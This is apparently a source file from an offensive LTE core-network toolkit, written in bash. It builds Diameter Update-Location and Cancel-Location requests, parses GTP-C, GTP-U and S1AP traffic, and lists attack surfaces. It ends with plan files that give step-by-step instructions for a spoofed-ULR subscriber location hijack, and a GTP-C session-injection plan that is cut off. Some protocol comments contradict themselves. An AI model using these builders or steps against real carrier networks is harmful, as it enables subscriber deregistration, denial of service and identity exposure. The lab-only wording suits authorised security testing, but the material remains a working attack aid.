    local vplmn_avp;   vplmn_avp=$(lcore_diameter_build_avp 1407 "$(lcore_nfc "$visited_plmn")" M)
    # ULR-Flags (AVP 1405 is UE-Usage-Type; ULR-Flags is 1405 in the older
    # numbering — TS 29.272 §7.3.7 assigns ULR-Flags = 1405 in Rel-8 and
    # later moved it; we emit the Rel-8 code the MMEs in the field use).
    local flags_avp;   flags_avp=$(lcore_diameter_build_u32_avp 1405 "$ulr_flags" M)
    local rat_avp;     rat_avp=$(lcore_diameter_build_u32_avp 1418 "$rat_type" M)

    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${vplmn_avp}${flags_avp}${rat_avp}"
    lcore_diameter_build_msg 316 16777251 192 2 2 "$avps"
}

lcore_build_clr() {
    local imsi="${1:-310150123456789}" origin_host="${2:-hss.localdomain}" \
          origin_realm="${3:-localdomain}" canc_type="${4:-0}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits\n' >&2; return 2
    }
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 3)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)
    # Cancel-Location-Request carries the User-Name (IMSI) and
    # Cancellation-Type (TS 29.272 §7.3.24): 0 = UPDATE_PROCEDURE,
    # 1 = INITIAL_ATTACH_PROCEDURE, 2 = SUBSCRIPTION_WITHDRAWAL,
    # 3 = UPDATE_PROCEDURE_IWF, 4 = INITIAL_ATTACH_PROCEDURE_IWF.
    local uname_avp; uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)
    local ct_avp;    ct_avp=$(lcore_diameter_build_u32_avp 1421 "$canc_type" M)
    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${ct_avp}"
    lcore_diameter_build_msg 317 16777251 192 3 3 "$avps"
}

# ── GTP-C v2 — TS 29.274 §5.1 ───────────────────────────────────────────
#
# Flags octet:
#   bit 8 : Version (2 for GTPv2)
#   bit 7 : P    Piggybacking
#   bit 6 : T    TEID present
#   bit 5 : MP   (spare, must be 0)
#   bits 4..1 : Message Type
#   bit 0 : spare (must be 0)
# Message Type is therefore in the *high* bits of octet 2... no: the flags
# byte is followed by the 1-octet Message Type, so the type is a full octet.
#
#   octet 0      : Flags
#   octet 1      : Message Type
#   octets 2..3  : Message Length (payload after the first 4 octets)
#   octets 4..7  : TEID (only when T=1)
#   octets n..n+2: Sequence Number (24-bit)
#   octet  n+3   : Spare
lcore_gtpc_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 8 )) || { printf 'ERROR\tGTP-C message shorter than 4 octets\n' >&2; return 1; }

    local flags="${hex:0:2}"
    local fv=$(( 16#$flags ))
    local ver=$(( (fv >> 5) & 0x07 ))
    local pt=$((  (fv >> 4) & 0x01 ))
    local tbit=$(( (fv >> 3) & 0x01 ))
    local mtype="${hex:2:2}"
    local len=$(( 16#${hex:4:2} * 256 + 16#${hex:6:2} ))

    printf 'version\t%s\n' "$ver"
    printf 'protocol\t%s\n' "$([[ $ver -eq 2 ]] && echo 'GTPv2-C' || echo "GTPv$ver")"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_P\t%s\n' "$pt"
    printf 'flag_T\t%s\n' "$tbit"
    printf 'message_type\t%s\n' "$((16#$mtype))"
    printf 'message_name\t%s\n' "$(lcore_gtpc_msg_name "$((16#$mtype))")"
    printf 'length\t%s\n' "$len"

    local off=4
    if (( tbit == 1 )); then
        (( ${#hex} >= 16 )) || { printf 'ERROR\tT flag set but no TEID present\n' >&2; return 1; }
        local teid=$(( 16#${hex:8:2} * 16777216 + 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))
        printf 'teid\t%s\n' "$teid"
        printf 'teid_hex\t%s\n' "${hex:8:8}"
        off=8
    else
        printf 'teid\tnone\n'
    fi
    # Sequence Number is 24 bits + 1 spare octet.
    (( ${#hex} >= (off + 4) * 2 )) || { printf 'ERROR\tGTP-C message truncated before the sequence number\n' >&2; return 1; }
    local b=$(( off * 2 ))
    local seq=$(( 16#${hex:$b:2} * 65536 + 16#${hex:$((b+2)):2} * 256 + 16#${hex:$((b+4)):2} ))
    printf 'sequence_number\t%s\n' "$seq"
    printf 'spare\t%s\n' "${hex:$((b+6)):2}"
    printf 'payload\t%s\n' "${hex:$((b+8))}"
    printf 'payload_octets\t%s\n' "$(( ${#hex} / 2 - off - 4 ))"
    return 0
}

# Message Type — TS 29.274 Table 6.1-1.
lcore_gtpc_msg_name() {
    case "${1:-}" in
        1)   echo "Echo Request" ;;
        2)   echo "Echo Response" ;;
        3)   echo "Version Not Supported Indication" ;;
        32)  echo "Create Session Request" ;;
        33)  echo "Create Session Response" ;;
        34)  echo "Modify Bearer Request" ;;
        35)  echo "Modify Bearer Response" ;;
        36)  echo "Delete Session Request" ;;
        37)  echo "Delete Session Response" ;;
        38)  echo "Change Notification Request" ;;
        39)  echo "Change Notification Response" ;;
        64)  echo "Modify Bearer Command" ;;
        65)  echo "Modify Bearer Failure Indication" ;;
        66)  echo "Delete Bearer Command" ;;
        67)  echo "Delete Bearer Failure Indication" ;;
        68)  echo "Bearer Resource Command" ;;
        69)  echo "Bearer Resource Failure Indication" ;;
        70)  echo "Downlink Data Notification Failure Indication" ;;
        71)  echo "Trace Session Activation" ;;
        72)  echo "Trace Session Deactivation" ;;
        73)  echo "Stop Paging Indication" ;;
        95)  echo "Create Bearer Request" ;;
        96)  echo "Create Bearer Response" ;;
        97)  echo "Update Bearer Request" ;;
        98)  echo "Update Bearer Response" ;;
        99)  echo "Delete Bearer Request" ;;
        100) echo "Delete Bearer Response" ;;
        101) echo "Delete PDN Connection Set Request" ;;
        102) echo "Delete PDN Connection Set Response" ;;
        128) echo "Downlink Data Notification" ;;
        129) echo "Downlink Data Notification Ack" ;;
        130) echo "Search Bearer Request" ;;
        131) echo "Search Bearer Response" ;;
        160) echo "Create Forwarding Tunnel Request" ;;
        161) echo "Create Forwarding Tunnel Response" ;;
        162) echo "Suspend Notification" ;;
        163) echo "Suspend Acknowledge" ;;
        164) echo "Resume Notification" ;;
        165) echo "Resume Acknowledge" ;;
        170) echo "Create Indirect Data Forwarding Tunnel Request" ;;
        171) echo "Create Indirect Data Forwarding Tunnel Response" ;;
        176) echo "Release Access Bearers Request" ;;
        177) echo "Release Access Bearers Response" ;;
        *)   echo "unknown/extension" ;;
    esac
}

# ── GTP-C IE — TS 29.274 §8.1 ───────────────────────────────────────────
#
#   octet 0      : Type
#   octets 1..2  : Length (payload octets after this 4-octet header)
#   octet 3      : Spare (high nibble, must be 0) | Instance (low nibble)
#   octets 4..   : Value
lcore_gtpc_parse_ies() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || return 1
    local off=0 total=$(( ${#hex} / 2 ))
    local n=0
    while (( off + 4 <= total )); do
        local base=$(( off * 2 ))
        local t="${hex:$base:2}"
        local len=$(( 16#${hex:$((base+2)):2} * 256 + 16#${hex:$((base+4)):2} ))
        local si="${hex:$((base+6)):2}"
        local sval=$(( 16#$si ))
        (( off + 4 + len <= total )) || {
            printf 'ERROR\tGTP-C IE type %s claims %s value octets but only %s remain\n' \
                "$((16#$t))" "$len" "$(( total - off - 4 ))" >&2
            return 1
        }
        local val="${hex:$((base+8)):$((len*2))}"
        printf 'ie.%d.type\t%s\n' "$n" "$((16#$t))"
        printf 'ie.%d.name\t%s\n' "$n" "$(lcore_gtpc_ie_name "$((16#$t))")"
        printf 'ie.%d.length\t%s\n' "$n" "$len"
        printf 'ie.%d.spare\t%s\n' "$n" "$(( (sval >> 4) & 0x0F ))"
        printf 'ie.%d.instance\t%s\n' "$n" "$(( sval & 0x0F ))"
        printf 'ie.%d.value\t%s\n' "$n" "$val"
        # Typed rendering for the IEs a core-network analyst reads first.
        case "$((16#$t))" in
            1)  printf 'ie.%d.decoded\tIMSI=%s\n' "$n" "$(lcore_bcd_decode "$val")" ;;
            2)  printf 'ie.%d.decoded\tCause=%s\n' "$n" "$((16#${val:0:2}))" ;;
            3)  printf 'ie.%d.decoded\tMSISDN=%s\n' "$n" "$(lcore_bcd_decode "$val")" ;;
            71) printf 'ie.%d.decoded\tAPN=%s\n' "$n" "$(lcore_apn_decode "$val")" ;;
            86) printf 'ie.%d.decoded\tECGI=%s\n' "$n" "$(lcore_ecgi_decode "$val")" ;;
            87) printf 'ie.%d.decoded\tTAI=%s\n' "$n" "$(lcore_tai_decode "$val")" ;;
            5)  printf 'ie.%d.decoded\tCause=%s\n' "$n" "$((16#${val:0:2}))" ;;
        esac
        off=$(( off + 4 + len ))
        # GTP-C IEs are padded to a 4-octet boundary; padding is not
        # counted in Length.
        while (( off % 4 != 0 )); do off=$(( off + 1 )); done
        n=$(( n + 1 ))
    done
    printf 'ie_count\t%s\n' "$n"
    return 0
}

# IE Type — TS 29.274 Table 8.1-1.
lcore_gtpc_ie_name() {
    case "${1:-}" in
        0)   echo "Reserved" ;;
        1)   echo "IMSI" ;;
        2)   echo "Cause" ;;
        3)   echo "Recovery (Restart Counter)" ;;
        71)  echo "APN" ;;
        72)  echo "AMBR" ;;
        73)  echo "EBI" ;;
        74)  echo "IP Address" ;;
        75)  echo "MEI (Mobile Equipment Identity)" ;;
        76)  echo "MSISDN" ;;
        77)  echo "Indication" ;;
        78)  echo "P-TMSI" ;;
        79)  echo "P-TMSI Signature" ;;
        80)  echo "Hop Counter" ;;
        82)  echo "UE Time Zone" ;;
        83)  echo "Trace Information" ;;
        84)  echo "Complete Request Message" ;;
        85)  echo "GUTI" ;;
        86)  echo "F-Container" ;;
        87)  echo "F-Cause" ;;
        88)  echo "PLMN ID" ;;
        89)  echo "Target Identification" ;;
        90)  echo "Cancellation Type" ;;
        91)  echo "SRVCC Cause" ;;
        92)  echo "Delay Value" ;;
        93)  echo "Bearer Context" ;;
        94)  echo "Charging ID" ;;
        95)  echo "Charging Characteristics" ;;
        96)  echo "Trace Reference" ;;
        97)  echo "Bearer Flags" ;;
        99)  echo "PDN Type" ;;
        100) echo "PTI" ;;
        101) echo "DRX Parameter" ;;
        102) echo "UE Network Capability" ;;
        103) echo "MM Context (EPS Security Context)" ;;
        104) echo "PDN Connection" ;;
        105) echo "PDU Numbers" ;;
        106) echo "PTMSI" ;;
        107) echo "P-TMSI Type" ;;
        108) echo "P-TMSI Signature" ;;
        109) echo "Hop Counter" ;;
        110) echo "UE Time Zone" ;;
        111) echo "Serving Network" ;;
        114) echo "ULI (User Location Information)" ;;
        125) echo "FQ-CSID" ;;
        126) echo "Emergency Allocation Retention Priority" ;;
        127) echo "MM Context" ;;
        128) echo "Paging and Service Information" ;;
        129) echo "Integer Number" ;;
        130) echo "Millisecond Time Stamp" ;;
        131) echo "Monitoring Event Information" ;;
        132) echo "ECGI List" ;;
        133) echo "Remote UE Context" ;;
        134) echo "Remote UE Context List" ;;
        135) echo "Remote User ID" ;;
        136) echo "Remote UE IP Information" ;;
        137) echo "CIoT Optimizations" ;;
        138) echo "SCEF PDN Connection" ;;
        139) echo "Header Compression Configuration" ;;
        140) echo "Extended Protocol Configuration Options" ;;
        141) echo "Serving PLMN-Rate-Control" ;;
        142) echo "Counter" ;;
        143) echo "Mapped UE Usage Type" ;;
        144) echo "Secondary RAT Usage Data Report" ;;
        145) echo "UP Function Selection Indication Flags" ;;
        146) echo "Maximum Packet Lifetime" ;;
        147) echo "IP Address and Port Number" ;;
        148) echo "APN and Relative Capacity" ;;
        149) echo "Extended Protocol Configuration Options" ;;
        150) echo "Serving PLMN-Rate-Control" ;;
        151) echo "Counter" ;;
        152) echo "Mapped UE Usage Type" ;;
        153) echo "Secondary RAT Usage Data Report" ;;
        *)   echo "unknown/extension IE type" ;;
    esac
}

# NOTE on the task brief: it lists IE 86 as ECGI and 87 as TAI, and also
# describes ULI as "86/87". On the wire those two numbers are F-Container
# (86) and F-Cause (87); ECGI and TAI are *fields inside* the ULI IE (114),
# which is where this decoder reads them. Both interpretations are exposed:
# the raw type table above, and the ULI sub-field decoder below.
lcore_uli_decode() {
    local val; val=$(lcore_nfc "${1:-}")
    [[ ${#val} -ge 2 ]] || return 1
    local flags=$(( 16#${val:0:2} ))
    local off=1 desc=""
    printf 'uli.flags\t%s\n' "$flags"
    # Bit 1 (0x01) CGI, bit 2 (0x02) SAI, bit 3 (0x04) RAI,
    # bit 4 (0x08) TAI, bit 5 (0x10) ECGI, bit 6 (0x20) LAI.
    (( flags & 0x01 )) && { desc+="CGI "; printf 'uli.cgi\t%s\n' "${val:$((off*2)):14}"; off=$((off+7)); }
    (( flags & 0x02 )) && { desc+="SAI "; printf 'uli.sai\t%s\n' "${val:$((off*2)):14}"; off=$((off+7)); }
    (( flags & 0x04 )) && { desc+="RAI "; printf 'uli.rai\t%s\n' "${val:$((off*2)):14}"; off=$((off+7)); }
    (( flags & 0x08 )) && { desc+="TAI "; printf 'uli.tai\t%s\n' "$(lcore_tai_decode "${val:$((off*2)):10}")"; off=$((off+5)); }
    (( flags & 0x10 )) && { desc+="ECGI "; printf 'uli.ecgi\t%s\n' "$(lcore_ecgi_decode "${val:$((off*2)):14}")"; off=$((off+7)); }
    (( flags & 0x20 )) && { desc+="LAI "; printf 'uli.lai\t%s\n' "${val:$((off*2)):10}"; off=$((off+5)); }
    printf 'uli.present\t%s\n' "${desc:-none}"
    return 0
}

# TAI = MCC|MNC (3 octets, plain BCD) + TAC (2 octets), TS 29.274 §8.21.
lcore_tai_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 10 ]] || return 1
    printf '%s tac=%d' "$(lcore_plmn_from_octets "${v:0:6}")" "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))"
}

# ECGI = MCC|MNC (3 octets) + ECI (4 octets, 28 bits used), TS 29.274 §8.21.
lcore_ecgi_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 14 ]] || return 1
    printf '%s eci=%d' "$(lcore_plmn_from_octets "${v:0:6}")" \
        "$(( 16#${v:6:2} * 16777216 + 16#${v:8:2} * 65536 + 16#${v:10:2} * 256 + 16#${v:12:2} ))"
}

# APN is a sequence of labels, each length-prefixed (TS 23.003 §9.1).
lcore_apn_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ -n "$v" ]] || { printf ''; return 0; }
    local total=$(( ${#v} / 2 ))
    local off=0 out="" n
    while (( off < total )); do
        n=$(( 16#${v:$((off*2)):2} ))
        (( n == 0 )) && break
        (( off + 1 + n <= total )) || break
        local label="${v:$(((off+1)*2)):$((n*2))}"
        local txt; txt=$(lcore_hex_to_ascii "$label")
        out+="${out:+.}${txt}"
        off=$(( off + 1 + n ))
    done
    printf '%s' "$out"
}

lcore_hex_to_ascii() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return 0; }
    (( ${#hex} % 2 == 0 )) || { printf '%s' "$hex"; return 0; }
    local out="" i
    for (( i = 0; i < ${#hex}; i += 2 )); do
        # Same trap as lcore_diameter_utf8: accumulate the escape text,
        # never let an inner printf consume the backslash.
        out+="\\x${hex:$i:2}"
    done
    printf '%b' "$out" | lcore_sanitize_stream
    return 0
}

# GTP-C IMSI IE: the identity is BCD with the *same* nibble rule as the
# air interface (TS 29.274 §8.3), including the 0xF filler for an odd
# digit count and the leading digit-count octet.
lcore_bcd_decode() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return; }
    # The first octet of an IMSI/MSISDN IE is the number of digits.
    local ndigits=$(( 16#${hex:0:2} ))
    local body="${hex:2}"
    (( ndigits > 0 )) || { printf ''; return; }
    local out="" i
    for (( i = 0; i < ${#body}; i += 2 )); do
        out+="${body:$((i+1)):1}${body:$i:1}"
    done
    # Drop the filler nibble only if the digit count says so.
    out="${out:0:$ndigits}"
    printf '%s' "$out"
}

# ── GTP-U — TS 29.281 §5.1 ──────────────────────────────────────────────
#
#   octet 0      : Flags (bit 8 = Version 1, bit 6 = PT, bit 5 = spare,
#                  bit 4 = E (extension header present), bit 3 = S (sequence),
#                  bit 2 = PN (N-PDU number))
#   octet 1      : Message Type (0xFF = G-PDU, 0x01 = Echo Request,
#                  0x02 = Echo Response, 0xFE = Error Indication,
#                  0x1F = Supported Extension Headers Notification)
#   octets 2..3  : Length (octets after the mandatory 8-octet header)
#   octets 4..7  : TEID
#   octets 8..9  : Sequence Number    ) present only when S=1
#   octet  10    : N-PDU Number       ) present only when PN=1
#   octet  11    : Next Extension Header Type ) present only when E=1
lcore_gtpu_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 8 )) || { printf 'ERROR\tGTP-U shorter than the 8-octet mandatory header\n' >&2; return 1; }

    local flags="${hex:0:2}"
    local fv=$(( 16#$flags ))
    local ver=$(( (fv >> 5) & 0x07 ))
    local pt=$((  (fv >> 4) & 0x01 ))
    local ebit=$(( (fv >> 2) & 0x01 ))
    local sbit=$(( (fv >> 1) & 0x01 ))
    local pnbit=$(( fv & 0x01 ))
    local mtype="${hex:2:2}"
    local len=$(( 16#${hex:4:2} * 256 + 16#${hex:6:2} ))
    local teid=$(( 16#${hex:8:2} * 16777216 + 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))

    printf 'version\t%s\n' "$ver"
    printf 'protocol\t%s\n' "$([[ $ver -eq 1 ]] && echo 'GTPv1-U' || echo "GTPv$ver")"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_PT\t%s\n' "$pt"
    printf 'flag_E\t%s\n' "$ebit"
    printf 'flag_S\t%s\n' "$sbit"
    printf 'flag_PN\t%s\n' "$pnbit"
    printf 'message_type\t0x%s\n' "$mtype"
    printf 'message_name\t%s\n' "$(lcore_gtpu_msg_name "$((16#$mtype))")"
    printf 'length\t%s\n' "$len"
    printf 'teid\t%s\n' "$teid"
    printf 'teid_hex\t%s\n' "${hex:8:8}"

    local off=8
    if (( sbit == 1 || pnbit == 1 || ebit == 1 )); then
        (( ${#hex} >= 12 * 2 )) || { printf 'ERROR\toptional flags set but the 4-octet trailer is missing\n' >&2; return 1; }
        local b=16
        if (( sbit == 1 )); then
            printf 'sequence_number\t%s\n' "$(( 16#${hex:$b:2} * 256 + 16#${hex:$((b+2)):2} ))"
        else
            printf 'sequence_number\tnone\n'
        fi
        if (( pnbit == 1 )); then
            printf 'npdu_number\t%s\n' "$((16#${hex:$((b+4)):2}))"
        else
            printf 'npdu_number\tnone\n'
        fi
        if (( ebit == 1 )); then
            printf 'next_extension_header_type\t0x%s\n' "${hex:$((b+6)):2}"
            printf 'next_extension_header_name\t%s\n' "$(lcore_gtpu_ext_name "$((16#${hex:$((b+6)):2}))")"
        else
            printf 'next_extension_header_type\tnone\n'
        fi
        off=12
    else
        printf 'sequence_number\tnone\n'
        printf 'npdu_number\tnone\n'
        printf 'next_extension_header_type\tnone\n'
    fi

    # Extension header chain: each header is
    #   octet 0     : length in 4-octet units (0 means 1 unit)
    #   octet 1     : content
    #   octet 2     : next extension header type
    # The chain ends when the next-type octet is 0x00.
    if (( ebit == 1 )); then
        local eoff=$off n=0
        # The chain starts at the type named by the trailer's
        # next-extension-header octet, which is octet 11 (hex offset 22).
        # It is NOT at a fixed position further into the packet.
        local nextt=$(( 16#${hex:22:2} ))
        while (( nextt != 0 )) && (( (eoff + 2) * 2 <= ${#hex} )); do
            local b=$(( eoff * 2 ))
            local units=$(( 16#${hex:$b:2} ))
            (( units == 0 )) && units=1
            local ehlen=$(( units * 4 ))
            printf 'ext.%d.type\t0x%02X\n' "$n" "$nextt"
            printf 'ext.%d.name\t%s\n' "$n" "$(lcore_gtpu_ext_name "$nextt")"
            printf 'ext.%d.units\t%s\n' "$n" "$units"
            printf 'ext.%d.octets\t%s\n' "$n" "$ehlen"
            (( (eoff + ehlen) * 2 <= ${#hex} )) || { printf 'ext.%d.note\ttruncated at the end of the packet\n' "$n"; break; }
            printf 'ext.%d.content\t%s\n' "$n" "${hex:$((b+2)):$((ehlen*2-2))}"
            # Next-type octet is the last octet of this extension header.
            nextt=$(( 16#${hex:$(((eoff + ehlen - 1) * 2)):2} ))
            eoff=$(( eoff + ehlen ))
            n=$(( n + 1 ))
            (( n > 16 )) && break
        done
        printf 'ext_count\t%s\n' "$n"
        printf 'payload\t%s\n' "${hex:$((eoff*2))}"
    else
        printf 'ext_count\t0\n'
        printf 'payload\t%s\n' "${hex:$((off*2))}"
    fi
    return 0
}

lcore_gtpu_msg_name() {
    case "${1:-}" in
        1)   echo "Echo Request" ;;
        2)   echo "Echo Response" ;;
        26)  echo "Error Indication" ;;
        31)  echo "Supported Extension Headers Notification" ;;
        255) echo "G-PDU (T-PDU)" ;;
        *)   echo "unknown" ;;
    esac
}

# Extension Header Type — TS 29.281 Table 5.1-1.
lcore_gtpu_ext_name() {
    # Extension Header Type — TS 29.281 Table 5.1-1. The wire values are
    # 0x01..0x03, 0x20, 0x40, 0x81..0x85, 0xC0..0xC2.
    #
    # The argument is a DECIMAL integer, so these patterns are decimal:
    # `case` matches patterns as literal text, and a `0x40)` pattern would
    # never match the number 64.
    case "${1:-}" in
        0)   echo "No more extension headers" ;;
        1)   echo "MBMS Support Indication" ;;
        2)   echo "MS Info Change Reporting Support Indication" ;;
        3)   echo "Long PDCP PDU Number" ;;
        32)  echo "Service Class Indicator" ;;
        64)  echo "UDP Port" ;;
        129) echo "RAN Container" ;;
        130) echo "Long PDCP PDU" ;;
        131) echo "Xw RAN Container" ;;
        132) echo "NR RAN Container" ;;
        133) echo "PDU Session Container" ;;
        192) echo "PDCP PDU Number" ;;
        193) echo "Suspend Request" ;;
        194) echo "Suspend Response" ;;
        *)   echo "unknown extension header" ;;
    esac
}

# ── S1-MME / S1AP overview — TS 36.413 ──────────────────────────────────
# S1AP runs over SCTP on port 36412 (S1-MME). The SCTP association carries
# initiating messages in the INIT chunk and an arbitrary number of DATA
# chunks afterwards, each holding one S1AP PDU — either an
# InitiatingMessage, a SuccessfulOutcome or an UnsuccessfulOutcome,
# discriminated by the procedureCode and the trigger.
lcore_s1ap_procedures() {
    cat <<'EOF'
procedure	code	initiating	carries_identity
HandoverPreparation	0	HandoverRequired	no
HandoverResourceAllocation	1	HandoverRequest	no
HandoverNotification	2	HandoverNotify	no
PathSwitchRequest	3	PathSwitchRequest	no
HandoverCancellation	4	HandoverCancel	no
E-RABSetup	5	E-RABSetupRequest	no
E-RABModify	6	E-RABModifyRequest	no
E-RABRelease	7	E-RABReleaseCommand	no
E-RABReleaseIndication	8	E-RABReleaseIndication	no
InitialContextSetup	9	InitialContextSetupRequest	yes: UE identity via MME-UE-S1AP-ID
Reset	14	Reset	no
DownlinkNASTransport	11	DownlinkNASTransport	yes: NAS PDU (may carry Identity Request)
InitialUEMessage	12	InitialUEMessage	yes: S-TMSI or IMSI, TAI, ECGI, RRC establishment cause
UplinkNASTransport	13	UplinkNASTransport	yes: NAS PDU (may carry Identity Response with IMSI)
NASNonDeliveryIndication	15	NASNonDeliveryIndication	yes: NAS PDU
ErrorIndication	16	ErrorIndication	no
UEContextReleaseRequest	18	UEContextReleaseRequest	no
UEContextRelease	23	UEContextReleaseCommand	no
Paging	10	Paging	yes: UE Identity Index value (IMSI mod 1024)
S1Setup	17	S1SetupRequest	no
UEContextModification	21	UEContextModificationRequest	no
UECapabilityInfoIndication	22	UECapabilityInfoIndication	no
eNBStatusTransfer	24	eNBStatusTransfer	no
MMEStatusTransfer	25	MMEStatusTransfer	no
DeactivateTrace	26	DeactivateTrace	no
TraceStart	27	TraceStart	no
TraceFailureIndication	28	TraceFailureIndication	no
LocationReportingControl	29	LocationReportingControl	no
LocationReportingFailureIndication	30	LocationReportingFailureIndication	no
LocationReport	31	LocationReport	yes: E-UTRAN CGI, TAI, PSCell
OverloadStart	32	OverloadStart	no
OverloadStop	33	OverloadStop	no
WriteReplaceWarning	34	WriteReplaceWarningRequest	no
eNBDirectInformationTransfer	35	eNBDirectInformationTransfer	no
MMEDirectInformationTransfer	36	MMEDirectInformationTransfer	no
PrivateMessage	37	PrivateMessage	no
eNBConfigurationTransfer	38	eNBConfigurationTransfer	no
MMEConfigurationTransfer	39	MMEConfigurationTransfer	no
CellTrafficTrace	40	CellTrafficTrace	no
Kill	43	Kill	no
DownlinkUEAssociatedLPPaTransport	44	DownlinkUEAssociatedLPPaTransport	yes
UplinkUEAssociatedLPPaTransport	45	UplinkUEAssociatedLPPaTransport	yes
DownlinkNonUEAssociatedLPPaTransport	46	DownlinkNonUEAssociatedLPPaTransport	no
UplinkNonUEAssociatedLPPaTransport	47	UplinkNonUEAssociatedLPPaTransport	no
EOF
}

lcore_s1ap_identity_procedures() {
    cat <<'EOF'
procedure	code	direction	identity_risk
InitialUEMessage	12	eNB -> MME	high: a UE that has no S-TMSI must send its IMSI in the clear in the NAS Attach Request
UplinkNASTransport	13	eNB -> MME	high: carries Identity Response; an IMSI answer is readable on the S1-MME
DownlinkNASTransport	11	MME -> eNB	high: carries Identity Request; if issued before Security Mode it is the classic exposure
Paging	10	MME -> eNB	medium: UE Identity Index value = IMSI mod 1024, so an observer can correlate a subscriber
LocationReport	31	eNB -> MME	medium: precise E-UTRAN CGI and TAI for a live subscriber
EOF
}

# ── attack-surface notes ────────────────────────────────────────────────
lcore_surface_notes() {
    cat <<'EOF'
surface	protocol	precondition	impact	note
unprotected-diameter-peer	Diameter/S6a	TCP or SCTP reachable on 3868 with no TLS and no IPsec	credential and subscriber-data exposure	Diameter has no built-in confidentiality; RFC 6733 §6.2 and TS 33.210 place security in IPsec or TLS, and field deployments frequently run neither on the internal core
spoofed-ulr	Diameter/S6a	a peer that accepts an Update-Location-Request from an unauthorised Origin-Host	location hijack and subscriber DoS	a forged ULR moves the subscriber's serving node to the attacker's identity; subsequent MT traffic and paging are directed elsewhere, and the real MME is cancelled
gtpc-create-session-injection	GTP-C v2	a reachable S-GW or P-GW TEID with no peer allow-list	resource exhaustion and traffic redirection	a Create Session Request carries the IMSI, TAI/ECGI and APN; an accepted one allocates a bearer and a charging record for a session the attacker controls
sctp-multihoming	SCTP/S1-MME	an association with more than one path	path failover is abused to bypass a single-homed filter	SCTP multihoming (RFC 4960 §6.4) lets a peer add an address with ASCONF; a filtering middlebox on the primary path does not see the alternate one
gtpu-teid-guessing	GTP-U	an S-GW or P-GW that accepts G-PDUs for unknown TEIDs	tenant traffic injection and interception	the TEID is a 32-bit value with no integrity protection; a lab can enumerate live TEIDs from the control plane and inject into the user plane
EOF
}

# ── plan files — status: handoff ────────────────────────────────────────
lcore_plan_write() {
    local name="$1" title="$2" needs="$3" body="$4"
    mkdir -p "$LCORE_PLANS" || {
        printf 'ERROR\tcannot create %s\n' "$LCORE_PLANS" >&2; return 1
    }
    local out="$LCORE_PLANS/${name}.plan"
    {
        printf 'status: handoff\n'
        printf 'plan: %s\n' "$title"
        printf 'module: 11_lte_core.sh (lcore)\n'
        printf 'requires: %s\n' "$needs"
        printf 'generated: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        printf '\n'
        printf '%s\n' "$body"
    } > "$out" || { printf 'ERROR\tcould not write %s\n' "$out" >&2; return 1; }
    [[ -s "$out" ]] || { printf 'ERROR\t%s is empty\n' "$out" >&2; return 1; }
    printf '%s' "$out"
}

lcore_plan_ulr_hijack() {
    local body
    body=$(cat <<'EOF'
# Spoofed Update-Location-Request (S6a/S6d) — subscriber location hijack

## What this does
An MME identifies itself to the HSS in a ULR by its Origin-Host and
Origin-Realm. A forged ULR that names a different serving node causes the
HSS to move the subscriber's registration to that node and to cancel the
registration at the real MME (CLR/CLA, command 317). The subscriber
then cannot be paged or reached for MT services until they re-attach.

## What is already implemented in software
- ULR built byte-exactly: `11_lte_core.sh --build-ulr <IMSI>`
  (command 316, application 16777251, Origin-Host/Realm, Session-Id,
  User-Name, Visited-PLMN-Id, ULR-Flags, RAT-Type).
- Full Diameter header and AVP encode/decode, including grouped AVPs.
- CLR builder: the same request shape a real HSS sends after a hijack.

## What the handoff needs
1. A lab HSS with an S6a peer reachable over TCP or SCTP on port 3868
   (free5GC, Open5GS, or a commercial HSS in a test rack).
2. That peer configured to accept requests from a *new* Origin-Host —
   i.e. no Diameter peer allow-list and no TLS. If the peer validates
   Origin-Host against a configured peer table, the vector does not run.
3. A subscriber provisioned in the HSS whose IMSI you may deregister.
4. A second MME (srsRAN + a real MME, or a second Open5GS MME instance)
   to observe the CLR arriving at the legitimate serving node.

## Steps
1. Bring up the lab MME and attach a test UE; capture S6a on the HSS.
2. Read the real ULR from the capture to learn the accepted Origin-Host.
3. `11_lte_core.sh --build-ulr <IMSI> <forged-host> <realm> <plmn> 6 0`
4. Send the bytes over the S6a transport with a Diameter client.
5. Watch for a 2001 ULA and for a CLR leaving the HSS toward the real MME.
6. Confirm the UE is no longer reachable (MT call or paging attempt).

## Safety
This deregisters a real subscriber. Only run it against an IMSI that is
provisioned for the test, on a network you own or are contracted to test.
EOF
)
    lcore_plan_write "ulr-hijack" "Spoofed S6a Update-Location-Request (subscriber location hijack)" \
        "a lab HSS with an exposed S6a peer (TCP/SCTP 3868, no TLS, no peer allow-list) plus one provisioned test IMSI; optionally a second MME to observe the CLR" \
        "$body"
}

lcore_plan_gtp_inject() {
    local body
    body=$(cat <<'EOF'
# GTP-C Create Session injection into an EPC

## What this does
A Create Session Request (message type 32) sent to an S-GW or P-GW with a
valid TEID makes the core allocate a bearer and a charging record for a
